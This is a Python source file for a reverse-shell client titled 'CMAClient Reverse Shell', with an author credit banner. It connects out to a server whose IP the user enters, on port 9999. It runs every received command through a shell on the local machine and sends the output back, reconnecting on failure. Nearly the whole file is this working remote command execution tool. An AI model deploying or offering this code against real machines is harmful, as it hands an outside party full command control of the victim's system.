import os
import socket
import subprocess
import time
import threading
from tabulate import tabulate, tabulate_formats

try:
    print(tabulate_formats)

    os.system("title %s" % "CMAClient Reverse Shell")
    os.system("color 0a")
    os.system("cls")
    print("#" * 33)
    dev_det = tabulate(
        [[
            "Developed by Calvoo softwares\nCalvine Museywa Azenga\nmuscalazems@gmail.com\n+254700666848\nCopyright @ 2020"]],
        tablefmt='pretty')
    print(dev_det)
    print("#" * 33 + "\n")


    # Create a socket
    def socket_create():
        try:
            global host
            global port
            global s
            port = 9999
            s = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))
            socket_connect()
            pass


    # Connect to the remote server
    def socket_connect():
        try:
            global host
            global port
            global s
            host = input("Enter the Servers IP address:: ")
            s.connect((host, port))
            print("Successfully Connected to CMAServer " + str(s.getpeername()))
        except socket.error as msg:
            print("Socket connection error: " + str(msg))
            time.sleep(3)
            socket_connect()


    # Receive commands from remote server and run on local machine
    def receive_commands():
        while True:
            data = s.recv(8192*2)
            if data[:2].decode("cp1252",errors='ignore') == 'cd':
                try:
                    os.chdir(data[3:].decode("cp1252",errors='ignore'))
                except:
                    pass
            if data[:].decode("cp1252",errors='ignore') == 'quit':
                s.close()
                break
            if len(data) > 0:
                def sendReslts():
                    try:
                        cmd = subprocess.Popen(data[:].decode("cp1252",errors='ignore'), shell=True, stdout=subprocess.PIPE,
                                               stderr=subprocess.PIPE)
                        output_bytes = cmd.stdout.read() + cmd.stderr.read()
                        output_str = str(output_bytes, "cp1252")
                        # with open('helpfle.txt','wb') as file:
                        #     file.write(output_bytes)
                        try:
                            s.send(str.encode(output_str + str(os.getcwd()) + '> ',encoding="cp1252",errors='ignore'))
                        except:
                            pass
                        # print(output_str)
                    except:
                        output_str = "Command not recognized" + "\n"
                        s.send(str.encode(output_str + str(os.getcwd()) + '> ',encoding="cp1252",errors='ignore'))
                        # print(output_str)

                thr = threading.Thread(target=sendReslts)
                thr.daemon = True
                thr.start()
        s.close()


    def main():
        global s
        try:
            socket_create()
            socket_connect()
            receive_commands()
        except:
            print("Error in main method")
            time.sleep(3)
            main()


    main()

except:
    pass
